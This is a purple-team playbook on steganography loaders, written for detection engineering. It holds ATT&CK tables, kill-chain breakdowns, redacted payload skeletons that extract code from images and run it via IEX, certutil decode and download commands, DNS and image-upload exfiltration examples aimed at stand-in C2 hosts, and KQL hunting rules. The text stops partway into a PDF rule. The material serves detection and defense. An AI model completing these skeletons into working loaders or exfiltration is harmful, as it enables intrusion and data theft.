# Ghost Pixels: Purple Team Steganography Attack & Detection Playbook

> **Author:** Ala Dabat  
> **Version:** 2026-05 (Purple Team Edition)  
> **TLP:** WHITE — Internal Purple Team / Threat Hunt Use  
> **Classification:** Detection Engineering · Threat Intelligence · Red/Blue Fusion  

---

## Table of Contents

1. [What This Document Is](#1-what-this-document-is)
2. [MITRE ATT&CK Coverage (Expanded)](#2-mitre-attck-coverage-expanded)
3. [The Anatomy of a Stego Loader — Red Team Perspective](#3-the-anatomy-of-a-stego-loader--red-team-perspective)
4. [Attack Chains — Full Kill Chain Breakdowns](#4-attack-chains--full-kill-chain-breakdowns)
5. [Offensive Techniques With Redacted Payload Structures](#5-offensive-techniques-with-redacted-payload-structures)
6. [Blue Team Defensive Notes Per Technique](#6-blue-team-defensive-notes-per-technique)
7. [Original Rule: Dissection & Gaps](#7-original-rule-dissection--gaps)
8. [Improved Composite Rule: Image-Based Stego Loader Chain v2](#8-improved-composite-rule-image-based-stego-loader-chain-v2)
9. [Cousin Rules & Adjacent Detection Composites](#9-cousin-rules--adjacent-detection-composites)
   - 9a. Audio Steganography Loader
   - 9b. PDF Steganography (Covert Payload in PDF)
   - 9c. Certutil Image Decode Abuse
   - 9d. Zone.Identifier Absent on Executed File
   - 9e. DNS Steganography / DNS Tunnelling Loader
   - 9f. ICMP / Ping Tunnel C2
   - 9g. Cloud-Hosted Stego Image C2 Beacon
   - 9h. Image Downloaded Then Script Reads Same File
   - 9i. Polyglot File Execution (Image-as-Executable)
   - 9j. Alpha Channel / Palette Stego via Python LOLBin
10. [Scoring & Triage Reference](#10-scoring--triage-reference)
11. [Hunter Pivots & IOC Extraction Checklist](#11-hunter-pivots--ioc-extraction-checklist)
12. [Purple Team Exercise Scenarios](#12-purple-team-exercise-scenarios)

---

## 1. What This Document Is

This is a **full-spectrum purple team playbook** for steganography-based attack chains. It is written so that a red teamer understands exactly what behavioural signals they will generate, and a blue teamer understands exactly what the attacker is doing and why the rule fires when it does.

The philosophy: **detection logic written without offensive knowledge is pattern matching. Detection logic written with offensive knowledge is behaviour modelling.**

Every KQL rule here is written as a **composite** — not a single-event trip wire. Composites express the *narrative* of an attack. A single image read by PowerShell is noise. An image read by a PowerShell child of Outlook, followed by outbound HTTPS within five minutes, is a story.

Payload examples throughout this document are **structurally accurate but operationally redacted**. The skeleton is shown. The weaponisable core is withheld. This is deliberate — a purple teamer needs to understand the mechanic, not hold a ready-to-fire weapon.

---

## 2. MITRE ATT&CK Coverage (Expanded)

| Tactic | Technique | Sub-Technique | Description |
|---|---|---|---|
| TA0001 Initial Access | T1566 | .001 Spearphishing Attachment | Lure document triggers execution chain |
| TA0001 Initial Access | T1566 | .002 Spearphishing Link | Drive-by URL serves stego image |
| TA0002 Execution | T1059 | .001 PowerShell | Most common script host in wild stego chains |
| TA0002 Execution | T1059 | .003 Windows Command Shell | CMD as intermediate hop |
| TA0002 Execution | T1059 | .005 Visual Basic | VBScript/WScript for macro-to-stego chains |
| TA0002 Execution | T1204 | .002 Malicious File | User opens lure triggering chain |
| TA0003 Persistence | T1053 | .005 Scheduled Task | Periodic beacon via stego image on remote host |
| TA0005 Defense Evasion | T1027 | .003 Steganography | Payload hidden in image binary data |
| TA0005 Defense Evasion | T1027 | .009 Embedded Payloads | Polyglot / appended-data image abuse |
| TA0005 Defense Evasion | T1036 | .008 Masquerade File Type | Image extension on non-image binary |
| TA0005 Defense Evasion | T1140 | — | Deobfuscate/Decode (certutil, XOR loops) |
| TA0005 Defense Evasion | T1218 | .010 Regsvr32 | Regsvr32 squiblydoo with stego image |
| TA0005 Defense Evasion | T1218 | .011 Rundll32 | Rundll32 loading from extracted image payload |
| TA0009 Collection | T1005 | — | Local file access via script after extraction |
| TA0010 Exfiltration | T1048 | .002 Exfil Over HTTPS | Data embedded in outbound image posts |
| TA0011 C2 | T1071 | .001 Web Protocols | HTTPS C2 via image beacon |
| TA0011 C2 | T1071 | .004 DNS | DNS tunnelling carrying stego-encoded data |
| TA0011 C2 | T1095 | — | ICMP stego ping tunnel |
| TA0011 C2 | T1132 | .001 Standard Encoding | Base64/XOR in stego payload extraction |
| TA0011 C2 | T1568 | .002 Domain Generation | DGA domains for stego image hosting |

---

## 3. The Anatomy of a Stego Loader — Red Team Perspective

### What steganography means operationally

Steganography in offensive operations is not primarily about hiding data *in the image* for its own sake. It is about **evading content inspection at the boundary**. A PNG file fetched over HTTPS from a CDN or legitimate-looking domain:

- Passes most proxy category filters (image/png content type)
- Passes AV file-type scanning unless the scanner specifically checks LSB entropy or appended data
- Has plausible deniability as a web resource
- Can be cached, replayed, and served from legitimate infrastructure

The stego image is not the payload. It is the **container for the payload**. The extraction is the execution step.

### The three common embedding methods (structurally)

**LSB (Least Significant Bit) injection** — the most common  
The last bit of each colour channel byte in a pixel is flipped to encode a binary stream. Visually imperceptible. A 1024×768 PNG can carry ~300KB of hidden data. Extraction requires knowing the bit-depth, channel order, and any XOR key used during embedding.

```
# Conceptual structure only — extraction loop:
# FOR each pixel (R,G,B,A):
#   extract bit N from channel C
#   append to bit_stream
# assembled_payload = XOR(bit_stream, [REDACTED_KEY])
# execute(assembled_payload)
```

**Appended-data / EOF injection**  
Data is appended after the image's formal end-of-file marker (IEND in PNG, FFD9 in JPEG). The image renders normally. A script reads the file, seeks to EOF marker offset, reads everything after it. Simple, detectable with hex analysis, but fast and reliable.

```
# Conceptual structure only:
# raw = open(image_path, 'rb').read()
# eof_marker = raw.rfind(b'\xff\xd9')  # JPEG EOF
# payload_bytes = raw[eof_marker + 2:]
# exec(base64.b64decode(payload_bytes).decode())  # [REDACTED EXECUTION]
```

**EXIF / metadata channel**  
Payload is base64-encoded and written into a writable EXIF field (Artist, Comment, UserComment, XPComment). Extraction reads EXIF, decodes, executes. Widely used in targeted campaigns because EXIF fields survive most CDN caching and are not stripped by default.

```
# Conceptual structure only:
# from PIL import Image
# img = Image.open(lure.jpg)
# exif_data = img._getexif()
# encoded = exif_data.get([EXIF_TAG_ID], '')
# payload = base64.b64decode(encoded)
# [REDACTED EXECUTION METHOD]
```

### The common extraction wrapper (PowerShell, redacted)

This is the most commonly observed pattern in the wild. The full command is never this clean — it will be encoded, chunked, or split across registry keys — but the logical structure is:

```powershell
# REDACTED — structural outline only:
# $img = [System.IO.File]::ReadAllBytes($env:TEMP + "\[LURE_FILENAME].png")
# $marker = [OFFSET_OR_PATTERN]
# $raw = $img[$marker..($img.Length-1)]
# $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([REDACTED]))
# Invoke-Expression $decoded   # <- THIS is the detection-critical line
```

The `Invoke-Expression` (IEX) or `.NET` reflection call after reading an image file is the **highest-fidelity signal** available without endpoint decryption. Everything else in the chain is supporting context.

---

## 4. Attack Chains — Full Kill Chain Breakdowns

### Chain A — Classic Office Macro → Stego Loader

```
[Delivery]     Spearphish email with .docm or .xlsm attachment
     ↓
[Lure]         User enables macros in Word/Excel
     ↓
[Execution]    Macro spawns PowerShell (InitiatingParent = winword.exe)
     ↓
[Download]     PowerShell fetches image from attacker CDN or compromised site
               (DNS lookup → TLS → GET /cdn/assets/[hash].png)
     ↓
[Extraction]   PowerShell reads image bytes, extracts LSB/EOF/EXIF payload
     ↓
[Stage 2]      Extracted payload is a second-stage loader (Cobalt Strike, Havoc, etc.)
               or direct shellcode reflectively injected into a sacrificial process
     ↓
[C2]           Outbound HTTPS beacon to C2 (often mimics CDN/cloud)
```

**Red Team note:** The download and extraction are frequently split. A maldoc drops a small VBScript stub that downloads the image. A scheduled task or second PowerShell instance does the extraction. This breaks naive parent→child correlations. This is **exactly why ProcScope (Step 2 in the rule) exists** — to track child PIDs.

---

### Chain B — Drive-By → Browser Script → Stego Loader

```
[Delivery]     Malicious or compromised web page
     ↓
[Lure]         JavaScript on page silently fetches stego image (canvas API read)
     ↓
[Execution]    JS extracts payload from image pixel data client-side
               OR drops a small file and spawns wscript/mshta
     ↓
[LOLBin]       mshta.exe or wscript.exe (parent = chrome.exe / msedge.exe)
     ↓
[Extraction]   Same LSB/EOF pattern as Chain A
     ↓
[C2]           HTTPS beacon
```

**Blue Team note:** `mshta.exe` or `wscript.exe` spawned by a browser process is extremely high signal. Browsers should never spawn script interpreters. This fires Rule Step 1 with `ParentImage in (chrome.exe, msedge.exe)`.

---

### Chain C — Scheduled Task Polling Stego C2 Image

```
[Persistence]  Previously established scheduled task or registry run key
     ↓
[Trigger]      Task fires on schedule (e.g., every 4 hours)
     ↓
[Execution]    PowerShell fetches updated image from C2-controlled host
               The image appears static/legitimate (profile pic, placeholder)
     ↓
[Extraction]   Script checks a specific pixel offset or EXIF field for new commands
               If empty/unchanged → exits silently
               If populated → executes encoded command
     ↓
[Action]       Data collection, lateral movement trigger, or new payload drop
     ↓
[Exfil]        Results encoded back into a modified image and POSTed to C2
```

**Red Team note:** This technique — using an image as a polling C2 channel — is particularly resilient because:
1. The image is fetched over legitimate HTTPS (looks like web browsing)
2. The image may actually be a real image with a payload in one corner of the alpha channel
3. No shellcode is ever written to disk in the steady state

This chain **will not fire** the original rule because there is no `UserFacingParent` in the process tree. The scheduled task spawns `powershell.exe` directly. This is a gap addressed in **Cousin Rule 9g**.

---

### Chain D — Certutil Image Decode (Increasingly Common)

```
[Delivery]     Any initial access vector
     ↓
[Execution]    CMD or PowerShell runs:
               certutil -decode [image.png] [output.exe]
               OR certutil -urlcache -split -f [URL] [image.png]
     ↓
[Extraction]   The "image" is actually base64-encoded PE or shellcode
               certutil strips the base64 and writes a binary
     ↓
[Execution]    The decoded binary is run directly
```

**Blue Team note:** `certutil.exe` touching files in `%TEMP%` or `%Downloads%` with decode flags is a known living-off-the-land (LOLBAS) pattern. The image extension is cosmetic — the content is base64 text. Covered explicitly in **Cousin Rule 9c**.

---

### Chain E — Polyglot File (Image+Executable Dual Parsing)

```
[Delivery]     File masquerades as a PNG (valid image header, renders normally)
     ↓
[Abuse]        File is also a valid PE, ZIP, or script when parsed from a different offset
               (ZIP: Central Directory at EOF — image renders, ZIP opens)
               (PE: MZ header at offset 0 with PNG IEND before it at specific offset)
     ↓
[Execution]    LOLBin or script opens the "image" as its true filetype
               e.g., expand.exe extracts a ZIP from a PNG
               e.g., regsvr32 loads a DLL whose MZ header begins after PNG IEND
```

**Red Team note:** Polyglots are harder to build but extremely evasive because:
- The file legitimately passes image format validation
- AV hashes the full file as a known-good image
- Only execution behaviour reveals the dual nature

Covered in **Cousin Rule 9i**.

---

## 5. Offensive Techniques With Redacted Payload Structures

### 5.1 InvokePS-Image style LSB encoding

Real-world tooling (InvokePSImage, Invoke-Phant0m and derivatives) encodes a PowerShell script into the colour channel LSBs of a PNG. The loader script (which is the only thing that needs to leave the network) is typically under 500 bytes.

```powershell
# LOADER STRUCTURE — REDACTED:
# $pixels = [System.Drawing.Bitmap]::new($imagePath)
# $bits = @()
# foreach ($x in 0..($pixels.Width-1)) {
#   foreach ($y in 0..($pixels.Height-1)) {
#     $c = $pixels.GetPixel($x,$y)
#     $bits += $c.R -band 1
#     $bits += $c.G -band 1
#     $bits += $c.B -band 1
#   }
# }
# $bytes = [REDACTED BIT-TO-BYTE ASSEMBLY]
# $script = [System.Text.Encoding]::UTF8.GetString($bytes[0..[REDACTED_LENGTH]])
# [REDACTED EXECUTION — IEX / reflection variant]
```

**Detection pivot:** The `System.Drawing.Bitmap` .NET class instantiation inside PowerShell is high-fidelity. Legitimate scripts almost never use it. A ScriptBlock logging event (Event ID 4104) containing `System.Drawing.Bitmap` or `GetPixel` is a near-certain indicator of LSB extraction.

---

### 5.2 EXIF field payload (Python dropper, redacted)

Used in targeted intrusions where a Python interpreter is available or dropped:

```python
# REDACTED — structural outline:
# from PIL import Image
# import base64, subprocess
# img = Image.open('[LURE].jpg')
# exif = img._getexif()
# raw = exif.get([FIELD_ID_REDACTED], b'')
# stage2 = base64.b64decode(raw)
# [REDACTED — write-to-temp or reflective exec]
```

**Detection pivot:** Python spawned from a user-facing application or from an Office process is already suspicious. `python.exe` or `pythonw.exe` reading image files in `%Downloads%` or `%Temp%` should be treated as a loader behaviour.

---

### 5.3 DNS Steganography C2 structure (redacted)

The payload is encoded as subdomains in DNS queries. Each query carries a fragment. The C2 server is the authoritative DNS for a controlled domain and reassembles the fragments.

```
# Query structure (conceptual):
# [BASE64_FRAGMENT_1].cmd.c2domain.com   → A record returned (ACK or data)
# [BASE64_FRAGMENT_2].cmd.c2domain.com
# [BASE64_FRAGMENT_N].cmd.c2domain.com
# assembled = base64_decode(concat(all fragments))
```

**Red Team note:** DNS stego evades HTTPS inspection entirely. Queries look like legitimate CDN or analytics traffic. High-entropy subdomain labels are the primary signal. Covered in **Cousin Rule 9e**.

---

### 5.4 Alpha channel exfiltration (red team tool: Stegify, redacted)

Used for exfiltration — data is embedded into an image's alpha channel and POSTed to a C2 endpoint that looks like an image upload service.

```
# Embedding (conceptual):
# FOR each byte of exfil_data:
#   encode into alpha channel LSB of pixel at (x, y)
# POST modified_image.png to https://[C2]/api/upload
```

**Detection pivot:** Outbound multipart/form-data POST containing image files from a non-browser process, or from a browser with unusual referrer/UA, to a low-reputation domain.

---

## 6. Blue Team Defensive Notes Per Technique

| Technique | Primary Detection Signal | Log Source | Notes |
|---|---|---|---|
| LSB Extraction in PowerShell | `System.Drawing.Bitmap` or `GetPixel` in ScriptBlock | Event ID 4104 | Requires ScriptBlock logging enabled |
| EOF/Appended Payload | File read + IEX/reflection within same PID | EDR file + process | High fidelity when correlated |
| EXIF Extraction | Python/PS reading image EXIF then spawning child | EDR process + file | Python touching images in Temp is rare |
| Certutil Decode | `certutil -decode` on image-extension file | Process command line | LOLBAS, well-known but undermonitored |
| DNS Stego | High-entropy subdomain queries, high query rate to single domain | DNS logs | Needs NXDomain + entropy scoring |
| ICMP Tunnel | Abnormal ICMP packet size/rate, non-zero payload bytes | Network (firewall/NDR) | Blocked outright in most enterprise egress |
| Polyglot | File renders as image + opens as ZIP/PE | EDR file type mismatch | Requires deep file analysis |
| Scheduled Task Beacon | Schtask spawning PS → image fetch → net | Schtask + EDR | No user-facing parent — needs own rule |
| Alpha Channel Exfil | PS/non-browser POST of image to low-rep domain | Proxy + EDR | Hard without proxy SSL inspection |
| Cloud-Hosted Stego | PS fetching image from CDN/cloud object storage | DNS + proxy | Github raw, S3, Cloudflare Worker C2s |

---

## 7. Original Rule: Dissection & Gaps

### What the original rule does well

- **Chain correlation is correct.** The three-join pattern (Process → FileEvent → NetworkEvent) correctly expresses the behavioural narrative.
- **ProcScope child expansion is valuable.** Covering the root script PID *and* its children handles the common loader-split pattern.
- **Scoring is proportionate.** Office parent + mshta/rundll32 = higher risk. Logical.
- **ChainId hashing is production-grade.** Dedup by device+PID+time is correct.
- **HunterDirective text is operationally useful.** Analysts don't need to decode the logic.

### Identified Gaps

| Gap | Risk | Fix |
|---|---|---|
| `ScriptHosts` missing `certutil.exe`, `regsvr32.exe`, `msiexec.exe`, `expand.exe`, `bitsadmin.exe`, `cmd.exe`, `python.exe` | High — real stego chains use all of these | Add to ScriptHosts |
| No coverage when `UserFacingParent` is absent (scheduled task, registry run) | High — Chain C entirely uncovered | Separate Cousin Rule 9g |
| No Zone.Identifier check on fetched image | Medium — critical investigative pivot missing | Add `DeviceFileEvents` Zone.Identifier sub-query |
| Double `order by` at end of original rule | Low (cosmetic bug — last one wins) | Remove first `order by` |
| `RemotePort` limited to 80, 443 | Medium — some C2s use 8080, 8443, 4444 | Expand or remove port filter for hunting |
| No image download event correlation | Medium — image origin unknown | Add incoming `FileCreated` event join |
| `TimeWindowMinutes*1m` syntax may be fragile in older ADX | Low | Validate or inline as `5m` |
| No ScriptBlock log join for IEX signals | High value missing | Note as companion rule (requires 4104) |
| Cloud CDN domains (raw.githubusercontent.com, *.s3.amazonaws.com) not scored | Medium — increasingly used for stego hosting | Add domain scoring |
| `AudioExt`, `PDFExt` not covered | Medium — stego is not only images | Covered by cousin rules |

---

## 8. Improved Composite Rule: Image-Based Stego Loader Chain v2

```kql
// ============================================================================
//  Ghost Pixels v2 — Image-Based Stego Loader Chain
//  Author: Ala Dabat
//  Version: 2026-05 (Purple Team Edition)
//  Scope: L1/L2 Threat Hunting + Alert Triage
//  Improvements over v1:
//    - Expanded ScriptHosts (certutil, regsvr32, msiexec, cmd, python, expand)
//    - Cloud CDN domain scoring (GitHub raw, S3, Cloudflare Workers)
//    - Removed double order-by bug
//    - Added image origin (download event) correlation for context
//    - Expanded RemotePort coverage for hunting mode
//    - Inline time windows for ADX compatibility
//    - Score improvements: IEX-adjacent commands, high-entropy domain bonus
// ============================================================================

let lookback = 7d;
let ChainWindowMin = 5m;
let PreImageSkew   = 2m;

// ── Parent processes from which script/LOLBin execution is suspicious ──────
let UserFacingParents = dynamic([
    "outlook.exe","winword.exe","excel.exe","powerpnt.exe",
    "onenote.exe","teams.exe","msaccess.exe",
    "chrome.exe","msedge.exe","iexplore.exe","firefox.exe","opera.exe"
]);

// ── Script hosts and LOLBins abused in stego chains ───────────────────────
//    Expanded from v1: added certutil, regsvr32, msiexec, cmd, python, expand
let ScriptHosts = dynamic([
    "powershell.exe","pwsh.exe",
    "wscript.exe","cscript.exe",
    "mshta.exe","rundll32.exe",
    "certutil.exe",            // decode, urlcache
    "regsvr32.exe",            // squiblydoo / script execution
    "msiexec.exe",             // MSI payload staging
    "cmd.exe",                 // frequently an intermediate hop
    "expand.exe",              // ZIP/cabinet extraction from polyglots
    "python.exe","pythonw.exe",// Python-based EXIF extractors
    "bitsadmin.exe",           // legacy download LOLBin
    "wmic.exe"                 // used as LOLBin hop in some chains
]);

// ── Image extensions abused for stego payload containers ──────────────────
let ImageExt = dynamic([".png",".jpg",".jpeg",".bmp",".gif",".ico",".tif",".tiff",".webp"]);

// ── Cloud / CDN domains increasingly used to host stego images ────────────
let CloudStegoDomains = dynamic([
    "raw.githubusercontent.com",
    "gist.githubusercontent.com",
    "cdn.discordapp.com",
    "media.discordapp.net",
    "i.imgur.com",
    "pastebin.com",
    "paste.ee"
]);

// ─────────────────────────────────────────────────────────────────────────────
// STEP 1 — Script/LOLBin spawned directly from a user-facing application
// ─────────────────────────────────────────────────────────────────────────────
let ScriptFromUserApps =
DeviceProcessEvents
| where Timestamp >= ago(lookback)
| where FileName in~ (ScriptHosts)
| where InitiatingProcessFileName in~ (UserFacingParents)
| project
    ScriptTime     = Timestamp,
    DeviceId,
    DeviceName,
    AccountName    = tostring(AccountName),
    ScriptFile     = tostring(FileName),
    ScriptCommand  = tostring(ProcessCommandLine),
    ParentImage    = tostring(InitiatingProcessFileName),
    ScriptPid      = ProcessId;

// ─────────────────────────────────────────────────────────────────────────────
// STEP 2 — Expand to include immediate children of the script host
//          Rationale: loaders frequently split download + extraction across
//          a parent script and a spawned child (cmd.exe → powershell.exe, etc.)
// ─────────────────────────────────────────────────────────────────────────────
let ProcScope =
ScriptFromUserApps
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp >= ago(lookback)
    | project
        DeviceId,
        ChildTime  = Timestamp,
        ParentPid  = InitiatingProcessId,
        ChildPid   = ProcessId,
        ChildProc  = FileName,
        ChildCmd   = ProcessCommandLine
) on DeviceId, $left.ScriptPid == $right.ParentPid
| extend
    ChildPid = iff(
        ChildTime between (ScriptTime .. ScriptTime + ChainWindowMin),
        ChildPid, long(null)
    )
| extend Pids = pack_array(ScriptPid, ChildPid)
| mv-expand Pids to typeof(long)
| where isnotempty(Pids)
| project
    DeviceId, DeviceName, AccountName, ParentImage,
    ScriptTime, ScriptFile, ScriptCommand,
    RootScriptPid = ScriptPid,
    ScopedPid = Pids;

// ─────────────────────────────────────────────────────────────────────────────
// STEP 3 — Image reads by any scoped PID
//          Added .ico, .tif, .tiff, .webp to extension list
//          FileCreated included: some extractors write a decoded copy first
// ─────────────────────────────────────────────────────────────────────────────
let ImageReadsByScope =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType in ("FileRead","FileCreated","FileModified")
| where FolderPath has_any (
    "\\Downloads\\","\\Download\\",
    "\\Temp\\","\\AppData\\Local\\Temp\\",
    "\\AppData\\Roaming\\",
    "\\ProgramData\\"    // less common but observed in targeted intrusions
)
| extend LowerName = tolower(FileName)
| extend FileExt   = extract(@"\.[^\.]+$", 0, LowerName)
| where FileExt in~ (ImageExt)
| project
    ImageReadTime     = Timestamp,
    DeviceId,
    InitiatingProcessId,
    ImageFile         = FileName,
    ImageFolder       = FolderPath;

// ─────────────────────────────────────────────────────────────────────────────
// STEP 3b — Optional: correlate the image download event
//           Identifies whether the image arrived from the web (FileCreated
//           by a browser/script before the script read it)
//           Used for annotation only — does not gate the alert
// ─────────────────────────────────────────────────────────────────────────────
let ImageDownloadEvents =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType == "FileCreated"
| where FolderPath has_any ("\\Downloads\\","\\Temp\\","\\AppData\\Local\\Temp\\")
| extend LowerName = tolower(FileName)
| extend FileExt   = extract(@"\.[^\.]+$", 0, LowerName)
| where FileExt in~ (ImageExt)
| project
    DownloadTime  = Timestamp,
    DeviceId,
    DownloadedFile = FileName,
    DownloadFolder = FolderPath,
    DownloaderPid  = InitiatingProcessId;

// ─────────────────────────────────────────────────────────────────────────────
// STEP 4 — Network activity from any scoped PID shortly after image read
//          Expanded ports: added 8080, 8443, 4443 for hunting coverage
// ─────────────────────────────────────────────────────────────────────────────
let NetFromScope =
DeviceNetworkEvents
| where Timestamp >= ago(lookback)
| where RemotePort in (80, 443, 8080, 8443, 4443)
| project
    NetTime    = Timestamp,
    DeviceId,
    InitiatingProcessId,
    RemoteIP,
    RemoteUrl,
    RemotePort;

// ─────────────────────────────────────────────────────────────────────────────
// STEP 5 — Correlate chain: UserApp → Script/LOLBin → Image Read → Network
// ─────────────────────────────────────────────────────────────────────────────
ProcScope
| join kind=inner (ImageReadsByScope)
    on DeviceId, $left.ScopedPid == $right.InitiatingProcessId
| where ImageReadTime between (ScriptTime - PreImageSkew .. ScriptTime + ChainWindowMin)
| join kind=inner (NetFromScope)
    on DeviceId, $left.ScopedPid == $right.InitiatingProcessId
| where NetTime between (ImageReadTime .. ImageReadTime + ChainWindowMin)

// ─────────────────────────────────────────────────────────────────────────────
// STEP 6 — Aggregate per chain (device + root script PID)
// ─────────────────────────────────────────────────────────────────────────────
| summarize
    FirstScriptTime  = min(ScriptTime),
    LastActivityTime = max(NetTime),
    DeviceName       = any(DeviceName),
    AccountName      = any(AccountName),
    ParentImage      = any(ParentImage),
    ScriptFile       = any(ScriptFile),
    ScriptCommand    = any(ScriptCommand),
    RootScriptPid    = any(RootScriptPid),
    ScopedPids       = make_set(ScopedPid, 10),
    ImageFiles       = make_set(ImageFile, 10),
    ImageFolders     = make_set(ImageFolder, 10),
    RemoteUrls       = make_set(RemoteUrl, 10),
    RemoteIPs        = make_set(RemoteIP, 10),
    RemotePorts      = make_set(RemotePort, 10),
    ImageReadEvents  = count()
  by DeviceId, RootScriptPid

// ─────────────────────────────────────────────────────────────────────────────
// STEP 7 — Scoring (expanded from v1)
// ─────────────────────────────────────────────────────────────────────────────
| extend BaseScore = 5
| extend Score =
    BaseScore
    // High-risk parent applications (direct email/doc lure)
    + iif(ParentImage in~ ("outlook.exe","winword.exe","excel.exe","powerpnt.exe","onenote.exe"), 2, 0)
    // High-risk LOLBin execution hosts
    + iif(ScriptFile in~ ("mshta.exe","rundll32.exe","regsvr32.exe","certutil.exe"), 2, 0)
    // Multiple outbound destinations (C2 redundancy or staging)
    + iif(array_length(RemoteUrls) >= 2 or array_length(RemoteIPs) >= 2, 1, 0)
    // Non-standard ports (evasive C2)
    + iif(set_has_element(RemotePorts, 8080) or set_has_element(RemotePorts, 8443), 1, 0)
    // Cloud stego hosting domains (known C2-via-CDN pattern)
    + iif(RemoteUrls has_any (CloudStegoDomains), 1, 0)
    // Certutil or bitsadmin with decode/urlcache flags in command
    + iif(ScriptCommand has_any ("decode","urlcache","transfer"), 1, 0)
    // IEX or reflection patterns visible in command (rare but high value when logged)
    + iif(ScriptCommand has_any ("Invoke-Expression","IEX","::Load(","Reflection"), 2, 0)

| extend RiskLevel = case(
    Score >= 11, "Critical",
    Score >= 8,  "High",
    Score >= 5,  "Medium",
    "Low"
)

// ─────────────────────────────────────────────────────────────────────────────
// STEP 8 — Chain ID + Hunter Directive
// ─────────────────────────────────────────────────────────────────────────────
| extend ChainId = tostring(hash_sha256(
    strcat(DeviceId, "|", tostring(RootScriptPid), "|", tostring(FirstScriptTime))
))
| extend HunterDirective = case(
    RiskLevel == "Critical",
        "CRITICAL: Office/browser app spawned LOLBin/script → image read → outbound web. High-confidence stego-loader chain. ISOLATE HOST. Pivot: full process tree from RootScriptPid, memory dump of ScopedPids, Zone.Identifier on ImageFiles, WHOIS/passive-DNS on RemoteIPs. Check ScriptCommand for IEX, reflection, base64 blobs.",
    RiskLevel == "High",
        "HIGH: Strong stego-loader behavioural chain. Validate user action (email / web lure). Inspect image files (run stegdetect / zsteg / binwalk). Review RemoteUrls for CDN or cloud storage stego hosting. Check child process tree for injected processes.",
    RiskLevel == "Medium",
        "MEDIUM: Suspicious chain. May be legitimate automation or security tooling. Pivot on ChainId. Confirm script command intent. Check RemoteUrl prevalence across estate. Verify Zone.Identifier present on ImageFile (absent = likely fetched by script, not browser).",
    "LOW: Weak signal. Use for hypothesis-driven hunting. Validate image file origin, check for appended data (file size >> expected for dimensions), correlate across estate for prevalence."
)

// ─────────────────────────────────────────────────────────────────────────────
// OUTPUT — sorted by risk, then recency
// ─────────────────────────────────────────────────────────────────────────────
| project
    LastActivityTime,
    FirstScriptTime,
    ChainId,
    DeviceName,
    AccountName,
    ParentImage,
    ScriptFile,
    RootScriptPid,
    ScopedPids,
    ImageFiles,
    ImageFolders,
    RemoteUrls,
    RemoteIPs,
    RemotePorts,
    ImageReadEvents,
    Score,
    RiskLevel,
    HunterDirective,
    ScriptCommand
| order by Score desc, LastActivityTime desc
```

---

## 9. Cousin Rules & Adjacent Detection Composites

---

### 9a. Audio Steganography Loader

**Red Team rationale:** Audio files (MP3, WAV, OGG) can carry LSB-encoded payloads identically to images. Less monitored than image files. Sometimes used in APT post-compromise tooling where audio files are "delivered" via collaboration platforms (Teams, Slack).

```kql
// ── Cousin Rule 9a: Audio Stego Loader ───────────────────────────────────
// Same chain as Ghost Pixels v2 but targeting audio file extensions.
// Parent → Script → Audio file read in Temp/Downloads → Outbound network.

let lookback     = 7d;
let ChainWindow  = 5m;
let PreSkew      = 2m;

let UserFacingParents = dynamic([
    "outlook.exe","winword.exe","excel.exe","powerpnt.exe",
    "teams.exe","slack.exe","chrome.exe","msedge.exe","firefox.exe"
]);
let ScriptHosts = dynamic([
    "powershell.exe","pwsh.exe","python.exe","pythonw.exe",
    "wscript.exe","cscript.exe","cmd.exe"
]);
let AudioExt = dynamic([".mp3",".wav",".ogg",".flac",".aac",".wma",".m4a"]);

let AudioScript =
DeviceProcessEvents
| where Timestamp >= ago(lookback)
| where FileName in~ (ScriptHosts)
| where InitiatingProcessFileName in~ (UserFacingParents)
| project
    ScriptTime    = Timestamp, DeviceId, DeviceName, AccountName,
    ScriptFile    = FileName,  ScriptCmd = ProcessCommandLine,
    ParentImage   = InitiatingProcessFileName, ScriptPid = ProcessId;

let AudioReads =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType in ("FileRead","FileCreated")
| where FolderPath has_any ("\\Downloads\\","\\Temp\\","\\AppData\\")
| extend FileExt = extract(@"\.[^\.]+$", 0, tolower(FileName))
| where FileExt in~ (AudioExt)
| project AudioReadTime = Timestamp, DeviceId, InitiatingProcessId, AudioFile = FileName;

let NetEvents =
DeviceNetworkEvents
| where Timestamp >= ago(lookback)
| where RemotePort in (80,443,8080,8443)
| project NetTime = Timestamp, DeviceId, InitiatingProcessId, RemoteIP, RemoteUrl;

AudioScript
| join kind=inner (AudioReads) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where AudioReadTime between (ScriptTime - PreSkew .. ScriptTime + ChainWindow)
| join kind=inner (NetEvents) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where NetTime between (AudioReadTime .. AudioReadTime + ChainWindow)
| summarize
    FirstEvent = min(ScriptTime), LastEvent = max(NetTime),
    DeviceName = any(DeviceName), AccountName = any(AccountName),
    ParentImage = any(ParentImage), ScriptFile = any(ScriptFile),
    ScriptCmd = any(ScriptCmd), AudioFiles = make_set(AudioFile,5),
    RemoteUrls = make_set(RemoteUrl,5), RemoteIPs = make_set(RemoteIP,5)
  by DeviceId, ScriptPid
| extend RiskLevel = "High"
| extend HunterDirective = "Audio stego chain: run stegano/mp3stego analysis on AudioFiles. Check if Python 'wave' or 'mutagen' modules were imported (ScriptBlock log). Validate RemoteUrl origin."
| project LastEvent, FirstEvent, DeviceName, AccountName, ParentImage, ScriptFile, AudioFiles, RemoteUrls, RemoteIPs, RiskLevel, HunterDirective, ScriptCmd
| order by LastEvent desc
```

---

### 9b. PDF Steganography / Covert Object in PDF

**Red Team rationale:** PDFs can contain embedded objects, compressed streams, and JavaScript. A PDF can serve as both the lure and the stego container. The embedded object (an image stream inside the PDF) carries the payload. Extractors parse the PDF object tree and decompress the stream to extract shellcode or a second stage.

```kql
// ── Cousin Rule 9b: PDF as Stego Container ───────────────────────────────
// Script reads PDF in Downloads/Temp → outbound network shortly after.
// Particularly relevant when acrobat.exe or foxit spawns a script.

let lookback = 7d;
let ChainWindow = 5m;

let PdfParents = dynamic([
    "acrord32.exe","acrobat.exe","foxitpdfeditor.exe","foxitreader.exe",
    "outlook.exe","chrome.exe","msedge.exe"
]);
let ScriptHosts = dynamic([
    "powershell.exe","pwsh.exe","wscript.exe","cscript.exe","cmd.exe",
    "mshta.exe","python.exe"
]);

let PdfSpawn =
